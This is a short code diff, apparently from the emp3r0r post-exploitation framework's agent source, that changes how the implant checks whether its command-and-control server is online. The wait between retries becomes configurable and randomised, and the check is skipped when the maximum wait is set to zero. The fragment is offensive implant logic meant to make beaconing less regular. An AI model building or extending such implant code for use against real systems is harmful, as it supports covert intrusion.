@@ -188,10 +188,12 @@ func main() {
 	log.Printf("Using proxy: %s", emp3r0r_data.AgentProxy)
 connect:
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
-	if !agent.IsCCOnline(emp3r0r_data.AgentProxy) {
-		log.Println("CC not online")
-		time.Sleep(time.Duration(util.RandInt(1, 120)) * time.Minute)
-		goto connect
+	if emp3r0r_data.IndicatorWaitMax != 0 { // if IndicatorWaitMax is 0, don't attempt
+		if !agent.IsCCOnline(emp3r0r_data.AgentProxy) {
+			log.Println("CC not online")
+			time.Sleep(time.Duration(util.RandInt(emp3r0r_data.IndicatorWaitMin, emp3r0r_data.IndicatorWaitMax)) * time.Minute)
+			goto connect
+		}
 	}
 
 	// check in with system info
